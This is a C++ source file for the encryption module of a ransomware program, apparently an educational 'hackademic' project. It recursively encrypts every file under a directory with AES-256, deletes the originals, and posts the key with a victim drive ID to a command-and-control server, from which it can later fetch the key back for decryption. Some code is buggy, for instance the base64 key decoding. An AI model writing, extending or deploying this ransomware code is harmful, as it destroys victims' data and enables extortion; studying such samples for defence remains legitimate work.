#include "cryptor.h"

#include <cpr/cpr.h>
#include <chrono>
#include <cstring>
#include <filesystem>
#include <fstream>
#include <iostream>
#include <thread>
#include <string>

#include <openssl/evp.h>
#include <openssl/rand.h>

#define BUFFER_SIZE 1024
#define INFO    "[i] "
#define ERROR   "[☓] "
#define OK      "[✓] "
#define INPUT   "[/] "
#define WORK    "[#] "
#define INDENT  " └─" 


// CST & DST

AES256CBC::AES256CBC() {
    evp_aes256cbc = EVP_CIPHER_fetch(NULL, "AES-256-CBC", NULL);
    key = new unsigned char[keySize_]();
}

AES256CBC::~AES256CBC() {
    EVP_CIPHER_free(evp_aes256cbc);
    delete[] key;
}


// Methods

void AES256CBC::base64DecodeKey(const std::string& encodedKey) {
    cout() << WORK << "Decoding key from base64...\n";
    int outLen = (encodedKey.length() * 3) / 4;
    unsigned char* decodedKey = new unsigned char[outLen];

    EVP_ENCODE_CTX *ctx = EVP_ENCODE_CTX_new();
    EVP_DecodeInit(ctx);
    int decodedLen = 0, tmpLen = 0;
    int status = EVP_DecodeUpdate(ctx, key, &decodedLen, reinterpret_cast<const unsigned char*>(encodedKey.c_str()), encodedKey.length());
    if (status < 0) {
        cout() << INDENT << ERROR << "Invalid base64 input.\n";
        EVP_ENCODE_CTX_free(ctx);
        return;
    }
    EVP_DecodeFinal(ctx, key + decodedLen, &tmpLen);
    EVP_ENCODE_CTX_free(ctx);

    delete[] key;
    key = decodedKey;
}

std::string AES256CBC::base64EncodeKey() {
    cout() << WORK << "Encoding key into base64...\n";
    int outLen = 4 * ((keySize_ + 2) / 3) + 1;
    unsigned char* encodedKey = new unsigned char[outLen];

    EVP_ENCODE_CTX *ctx = EVP_ENCODE_CTX_new();
    EVP_EncodeInit(ctx);
    int encodedLen = 0, tmpLen = 0;
    EVP_EncodeUpdate(ctx, encodedKey, &encodedLen, key, keySize_);
    EVP_EncodeFinal(ctx, encodedKey + encodedLen, &tmpLen);
    EVP_ENCODE_CTX_free(ctx);

    std::string encodedKeyStr(reinterpret_cast<char*>(encodedKey), encodedLen + tmpLen);
    
    delete[] encodedKey;
    return encodedKeyStr;
}

bool AES256CBC::decryptFile(std::filesystem::path path) {
    cout() << "[#] Decrypting " << path << "...\n";
    if (path.extension() != extension_) {
        cout() << INDENT << "Nothing to do.\n";
        return false;
    }
    std::ifstream fin(path, std::ios::binary);
    std::ofstream fout(path.replace_extension(), std::ios::binary);
    // IMPORTANT: path does not have the extension from this point!
    if (!fin or !fout) {
        cerr() << INDENT << ERROR << "Error opening file.\n";
        return false;
    }
     
    EVP_CIPHER_CTX *ctx = EVP_CIPHER_CTX_new();
    unsigned char iv[keySize_];
    fin.readsome((char*)iv, keySize_);
    if ( !ctx or !EVP_DecryptInit_ex(ctx, evp_aes256cbc, NULL, key, iv) ) {
        cerr() << INDENT << ERROR << "Error initializing encryption.\n";
        EVP_CIPHER_CTX_free(ctx);
        return false;
    }

    unsigned char buffer[BUFFER_SIZE];
    unsigned char decryptedBuffer[BUFFER_SIZE];
    int bytesRead, decryptedLen;

    while ((bytesRead = fin.readsome((char*)buffer, BUFFER_SIZE)) > 0) {
        EVP_DecryptUpdate(ctx, decryptedBuffer, &decryptedLen, buffer, bytesRead);
        fout.write((char*)decryptedBuffer, decryptedLen);
    }

    EVP_DecryptFinal_ex(ctx, decryptedBuffer, &decryptedLen);
    fout.write((char*)decryptedBuffer, decryptedLen);

    EVP_CIPHER_CTX_free(ctx);
    path += extension_;  // TODO: consider a way to make it look less stupid
                        // Maybe also unify the handling with the encryption
                        // function (also make it use one "path" and have it
                        // appended)

    fin.close();
    fout.close();
    std::filesystem::remove(path);
    cout() << INDENT << OK << "Done.\n";
    return true;
}

void AES256CBC::decryptRecursively(const std::filesystem::path& path) {
    //if (!key)  // Do we need this architecture-wise?
    if (!std::filesystem::is_directory(path)) {
        std::cerr << ERROR << "Not a directory: " << path << "\n";
        return;
    }
    if (!*key) {
        cerr() << ERROR << "Key is not present.\n";
        return;
    }
    for (const auto &entry : std::filesystem::recursive_directory_iterator(path)) {
        std::filesystem::path filename = entry.path();
        if (filename.extension() == extension_ and std::filesystem::is_regular_file(entry))
            decryptFile(filename);
    }

}

bool AES256CBC::encryptFile(const std::filesystem::path& pathIn) {
    cout() << "[#] Encrypting " << pathIn << "...\n";
    std::string pathOut = pathIn.string() + extension_;
    std::ifstream fin(pathIn, std::ios::binary);
    std::ofstream fout(pathOut, std::ios::binary);
    if (!fin or !fout) {
        cerr() << INDENT << ERROR << "Error opening file.\n";
        return false;
    }
    
    EVP_CIPHER_CTX *ctx = EVP_CIPHER_CTX_new();
    unsigned char iv[keySize_];
    RAND_bytes(iv, keySize_);
    if ( !ctx or !(*iv) or !EVP_EncryptInit_ex(ctx, evp_aes256cbc, NULL, key, iv) ) {
        cerr() << INDENT << ERROR << "Error initializing encryption.\n";
        EVP_CIPHER_CTX_free(ctx);
        return false;
    }
    fout.write((char*)iv, keySize_);

    unsigned char buffer[BUFFER_SIZE];
    unsigned char encryptedBuffer[BUFFER_SIZE];
    int bytesRead, encryptedLen;

    while ((bytesRead = fin.readsome((char*)buffer, BUFFER_SIZE)) > 0) {
        EVP_EncryptUpdate(ctx, encryptedBuffer, &encryptedLen, buffer, bytesRead);
        fout.write((char*)encryptedBuffer, encryptedLen);
    }

    EVP_EncryptFinal_ex(ctx, encryptedBuffer, &encryptedLen);
    fout.write((char*)encryptedBuffer, encryptedLen);

    fin.close();
    fout.close();
    std::filesystem::remove(pathIn);
    EVP_CIPHER_CTX_free(ctx);
    cout() << INDENT << OK << "Done.\n";
    return true;
}

void AES256CBC::encryptRecursively(const std::filesystem::path& path) {
    if (!std::filesystem::is_directory(path)) {
        cerr() << ERROR << "Not a directory: " << path << "\n";
        return;
    }
    if (!*key) {
        cerr() << ERROR << "Key is not present.\n";
        return;
    }
    for (const auto &entry : std::filesystem::recursive_directory_iterator(path)) {
        std::filesystem::path filename = entry.path();
        if (filename.extension() != extension_ and std::filesystem::is_regular_file(entry))
            encryptFile(filename);
    }
}

void AES256CBC::generateKey() {
    RAND_bytes(key, keySize_);
    cout() << INFO << "Generated new key.\n";
}

void AES256CBC::keyFromC2(const std::string& id) {
    auto getKey = [&]() {
        return cpr::Get(C2Addr + "/ReturnToSender",cpr::Body{"HDID="+id});
    };

    cpr::Response r;
    using namespace std::chrono_literals; // s, ns, ms, etc. | Altho I don't like this
    r = getKey();
    while (r.status_code != 200) {
        std::this_thread::sleep_for(60s); // Would rather have smth like 60std::chrono_literals::s
        r = getKey();
    }

    if (r.text.empty()) {
        cout() << INFO << "Key was not present on C2.\n";
        cout() << INDENT;
        generateKey();
    } else {
        cout() << INFO << "Fetched key from C2: " << r.text << std::endl;
        cout() << INDENT;
        base64DecodeKey(r.text);
    }
}

void AES256CBC::keyFromFile() {
    std::string keyPath;
    std::cout << INPUT << "Enter a path where to read the key from (default=./key.hackademic): ";
    getline(std::cin, keyPath);
    if (keyPath == "")
        keyPath = "./key.hackademic";
    std::ifstream fin(keyPath, std::ios::binary);
    if (!fin)
        cerr() << INDENT << ERROR << "Error opening file.\n";
    else {
        fin.readsome((char*)key, keySize_);
        cout() << INFO << "Read the key from:  " << keyPath << ".\n";
    }
}

void AES256CBC::keyToC2(const std::string& id) {
    std::string encodedKey = base64EncodeKey();
    auto postKey = [&]() {
        return cpr::Post(C2Addr + "/saveKey",
                         cpr::Body{"Key=" + encodedKey + "&HDID=" + id}
                        );
    };
    using namespace std::chrono_literals;
    cout() << WORK << "Sending key to C2...\n";
    while ( postKey().status_code != 200 ) {
        cout() << INDENT << " Working...\n";
        std::this_thread::sleep_for(60s);
    }
    cout() << INDENT << OK << "Done.\n";
}

void AES256CBC::keyToFile() {
    std::string keyPath;
    std::cout << INPUT << "Enter a path where to write the key to (default=./key.hackademic): ";
    getline(std::cin, keyPath);
    if (keyPath == "")
        keyPath = "./key.hackademic";
    std::ofstream fout(keyPath, std::ios::binary);
    if (!fout)
        cerr() << INDENT << ERROR << "Error opening file: " << keyPath << ".\n";
    else {
        fout.write((char*)key, keySize_);
        cout() << INFO << "Wrote key to:  " << keyPath << ".\n";
    }
}

